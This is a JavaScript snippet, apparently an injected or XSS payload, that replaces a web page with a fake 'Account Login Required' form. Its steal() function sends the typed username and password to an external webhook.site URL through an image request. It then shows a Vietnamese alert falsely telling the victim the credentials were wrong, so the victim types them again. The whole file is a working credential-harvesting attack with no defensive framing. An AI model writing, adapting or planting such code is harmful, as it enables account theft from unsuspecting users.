document.body.innerHTML = `
<style>
body{
    font-family: Arial, sans-serif;
    background:#f2f2f2;
}

.login-box{
    width:320px;
    margin:120px auto;
    padding:25px;
    background:white;
    border-radius:8px;
    box-shadow:0 0 10px rgba(0,0,0,0.2);
}

.login-box h3{
    text-align:center;
    margin-bottom:20px;
}

.login-box input{
    width:100%;
    padding:10px;
    margin-top:8px;
    margin-bottom:15px;
    border:1px solid #ccc;
    border-radius:4px;
}

.login-box button{
    width:100%;
    padding:10px;
    background:#1877f2;
    border:none;
    color:white;
    font-weight:bold;
    border-radius:4px;
    cursor:pointer;
}
</style>

<div class="login-box">

<h3>Account Login Required</h3>

<form id="phish">

<label>Username</label>
<input type="text" id="user">

<label>Password</label>
<input type="password" id="pass">

<button type="button" onclick="steal()">Login</button>

</form>

</div>
`;

function steal(){

var u = document.getElementById("user").value;
var p = document.getElementById("pass").value;

new Image().src="https://webhook.site/e319801d-31f5-459b-9bed-e43273bff0ae?user="+u+"&pass="+p;

alert("Sai username va mat khau, xin hay nhap lai can than!");

}
